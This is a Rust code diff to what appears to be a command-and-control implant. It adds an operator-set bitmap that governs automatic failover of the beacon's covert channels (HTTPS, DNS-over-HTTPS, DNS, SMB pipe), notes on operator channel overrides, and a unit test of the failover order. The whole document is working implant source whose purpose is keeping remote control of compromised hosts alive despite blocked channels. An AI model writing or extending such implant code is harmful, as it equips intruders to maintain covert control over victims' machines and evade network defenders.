@@ -345,7 +345,10 @@ fn accept_server_counter(counter: u64) -> bool {
 }
 
 /// Encode + send the pending batch, advancing counter on success.
-/// On send failure, tries fallback channels.
+/// On send failure, advances along the fallback chain resolved from
+/// `fallback_bitmap` (the operator-configured `Config::fallback_bitmap`;
+/// 0 = build-time default chain — see
+/// `nyx_implant_net::channels::next_fallback_with_bitmap`).
 ///
 /// Frame split + retention (wave-3, mirrors agent-dev): the cache may hold far
 /// more than one frame after a server outage, so only the leading prefix that
@@ -360,6 +363,7 @@ fn beacon_send_frame(
     key: &nyx_protocol::crypto::SessionKey,
     pending: &mut Vec<TaskResponse>,
     ch_ctx: &nyx_implant_net::channels::ChannelCtx,
+    fallback_bitmap: u8,
 ) -> Option<Vec<u8>> {
     // Retention bound: drop the oldest responses past PENDING_CAP and log it —
     // never grow unbounded while the server is unreachable.
@@ -404,7 +408,9 @@ fn beacon_send_frame(
         }
         None => {
             let active = nyx_implant_net::channels::get_active();
-            if let Some(fb) = nyx_implant_net::channels::next_fallback(active) {
+            if let Some(fb) =
+                nyx_implant_net::channels::next_fallback_with_bitmap(active, fallback_bitmap)
+            {
                 nyx_implant_net::channels::set_active(fb);
             } else {
                 nyx_implant_net::channels::set_active(nyx_implant_net::channels::PRIMARY_CHANNEL);
@@ -638,7 +644,8 @@ unsafe fn beacon_loop_cycle(
     }
 
     // Encode + send pending batch, receive server reply.
-    let Some(body) = beacon_send_frame(pubkey, counter, key, pending, ch_ctx) else {
+    let Some(body) = beacon_send_frame(pubkey, counter, key, pending, ch_ctx, cfg.fallback_bitmap)
+    else {
         return true; // send failed — retry next cycle
     };
 
@@ -1176,6 +1183,14 @@ fn execute_sleep(seconds: u32) -> Vec<Response> {
 }
 
 /// `SetChannel` arm: validate the channel's config gate, then hot-switch.
+///
+/// `fallback_bitmap` deliberately does NOT gate this command: the bitmap
+/// constrains *automatic* failover only (see
+/// `nyx_implant_net::channels::next_fallback_with_bitmap`), while SetChannel
+/// is an explicit operator override — ExtC2 channels in particular are
+/// operator-selected primaries that the bitmap cannot even encode. If an
+/// operator-selected channel outside the resolved chain later fails,
+/// automatic failover starts at the head of that chain.
 fn execute_set_channel(cfg: &Config, channel: u8) -> Vec<Response> {
     // Use from_u8 (new numbering scheme). Values 0-8 map to channels;
     // out-of-range values default to Https (not SmbPipe — the old bug
@@ -1515,6 +1530,56 @@ mod tests {
 
     fn test_ctx() -> nyx_implant_net::channels::ChannelCtx {
         nyx_implant_net::channels::ChannelCtx::from_config(&test_cfg())
+    }
+
+    #[test]
+    fn send_frame_failover_consumes_fallback_bitmap() {
+        use nyx_implant_net::channels::{get_active, set_active, Channel};
+        // Single fn for every CURRENT_CHANNEL assertion: the active channel
+        // is a shared static, so parallel tests must not interleave on it
+        // (same discipline as the ROTATION_IDX tests in channels/mod.rs).
+        // test_cfg points at a dead port, so every dispatch fails fast and
+        // takes the failover arm without touching the network.
+        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
+        let ctx = test_ctx();
+        let mut counter = 0u64;
+
+        // bitmap = 0 → backward-compat static chain: Https → DohDns.
+        set_active(Channel::Https);
+        assert!(
+            beacon_send_frame(&[0x24; 32], &mut counter, &key, &mut Vec::new(), &ctx, 0).is_none()
+        );
+        assert_eq!(get_active(), Channel::DohDns);
+
+        // bitmap selecting only Dns (bit 2): Https → Dns, skipping Doh.
+        set_active(Channel::Https);
+        assert!(beacon_send_frame(
+            &[0x24; 32],
+            &mut counter,
+            &key,
+            &mut Vec::new(),
+            &ctx,
+            1 << 2
+        )
+        .is_none());
+        assert_eq!(get_active(), Channel::Dns);
+
+        // bitmap with only ExtC2 bits (5-7) → automatic failover disabled:
+        // the resolved chain is empty, so exhaustion resets to the primary.
+        set_active(Channel::Dns);
+        assert!(beacon_send_frame(
+            &[0x24; 32],
+            &mut counter,
+            &key,
+            &mut Vec::new(),
+            &ctx,
+            0b1110_0000
+        )
+        .is_none());
+        assert_eq!(get_active(), Channel::Https);
+
+        // Restore the default so other tests observing the atomic are unaffected.
+        set_active(Channel::Https);
     }
 
     #[test]
